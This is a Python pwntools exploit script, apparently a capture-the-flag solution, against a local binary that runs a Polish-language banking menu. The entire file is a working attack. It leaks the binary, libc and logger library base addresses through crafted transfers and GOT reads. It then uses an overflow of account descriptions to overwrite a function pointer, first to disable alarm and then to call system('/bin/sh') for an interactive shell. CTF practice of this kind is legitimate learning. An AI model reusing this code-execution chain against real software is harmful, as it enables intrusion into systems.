from pwn import *
import re

# binary offsets
puts_plt = 0x000bf8
puts_got = 0x202f40
print_dec_offset = 0xe64
logger_got = 0x202fb0

# libc offsets
puts_offset = 0x6a3e0
binsh_offset = 0x168ed3
system_offset = 0x40db0
alarm_offset = 0xbb190

# liblogger offsets
logger_offset = 0x7a0

# base adressess
binary_base = None
libc_base = None
liblogger_base = None


p = process(['./chall', 'test.db'])


def send_msg(msg):
    print(msg)
    p.send(msg)


def wait_for(msg):
    m = p.recvuntil(msg)
    print(m)
    return m


def check_account(id):
    wait_for('Exit.')
    send_msg("2\n")
    wait_for(":")
    send_msg("{}\n".format(id))
    wait_for(".")


def create_account(id):
    wait_for('Exit.')
    send_msg("1\n")
    wait_for('(1-10): ')
    send_msg("{}\n".format(id))
    wait_for("USD")
    send_msg("3\n")
    wait_for("konta:")
    send_msg("Hacking time!\n")
    wait_for("h4x0r?")
    send_msg("no\n")
    print("## Account {} created".format(id))


def edit_account(id, desc):
    wait_for("Exit.")
    send_msg("3\n")
    wait_for(":")
    send_msg("{}\n".format(id))
    wait_for("konta:")
    send_msg(desc)
    print("## Account {} edited".format(id))


def make_transfer(src, dst, amt, desc):
    wait_for("Exit.")
    send_msg("5\n")
    wait_for(":")
    send_msg("{}\n".format(src))
    wait_for(":")
    send_msg("{}\n".format(dst))
    wait_for(":")
    send_msg("{}\n".format(amt))
    wait_for(":")
    send_msg("{}\n".format(desc))


def cancel_transfer(id):
    wait_for("Exit.")
    send_msg("7\n")
    wait_for("przelewu:")
    send_msg("{}\n".format(id))
    wait_for("roboczego.")


def get_print_dec_addr():
    global binary_base
    reg = re.compile(r"Przelew nr 1, z konta (\d*), na konto (\d*)")

    wait_for("Exit.")
    send_msg("6\n")
    m = wait_for("Menu:")

    g = reg.search(m)
    lo = int(g.group(1))
    hi = int(g.group(2))

    print_dec_addr = lo + hi * (1<<32)
    binary_base = print_dec_addr - print_dec_offset

    print("print_dec addr: {}".format(hex(print_dec_addr)))
    print("base address: {}".format(hex(binary_base)))


def get_puts_addr():
    global libc_base
    reg = re.compile(r"aaaa.*\n(.*)\nMenu:")

    wait_for('Exit.')
    send_msg("2\n")
    wait_for(":")
    send_msg("1\n")

    m = wait_for("Menu:")

    g = reg.search(m)
    addr = g.group(1)
    addr = addr + '\x00' * (8 - len(addr))
    addr = u64(addr)
    libc_base = addr - puts_offset

    print("libc address: {}".format(hex(libc_base)))


def get_logger_addr():
    global libc_base
    reg = re.compile(r"aaaa.*\n(.*)\nMenu:")

    wait_for('Exit.')
    send_msg("2\n")
    wait_for(":")
    send_msg("1\n")

    m = wait_for("Menu:")

    g = reg.search(m)
    addr = g.group(1)
    addr = addr + '\x00' * (8 - len(addr))
    addr = u64(addr)
    liblogger_base = addr - logger_offset

    print("liblogger address: {}".format(hex(liblogger_base)))


# leaking binary address

create_account(1)
create_account(2)

make_transfer(1, 2, 100, "test")
make_transfer(1, 2, 100, "test")

cancel_transfer(0)
cancel_transfer(1)

create_account(3)

get_print_dec_addr()


# leaking libc address

make_transfer(2, 1, 200 + binary_base + puts_got, "test")

edit_account(1, "a" * 109 + '\n')
check_account(1)
edit_account(1, "a" * 103 + p64(puts_plt + binary_base)[:7])

check_account(1)
get_puts_addr()


# disabling alarm

create_account(4)
edit_account(4, "a" * 109 + '\n')
check_account(4)
edit_account(4, "a" * 103 + p64(libc_base + alarm_offset)[:7])
check_account(4)
check_account(4)


# leaking liblogger address

make_transfer(1, 2, binary_base + puts_got, "test")
make_transfer(2, 1, binary_base + logger_got, 'logger')

check_account(1)
get_logger_addr()


# injecting shellcode

make_transfer(2, 4, libc_base + binsh_offset, "test")
edit_account(4, "a" * 103 + p64(libc_base + system_offset)[:7])
check_account(4)


wait_for('Exit.')
send_msg("2\n")
wait_for(":")
send_msg("4\n")
p.interactive()

wait_for("Exit.")
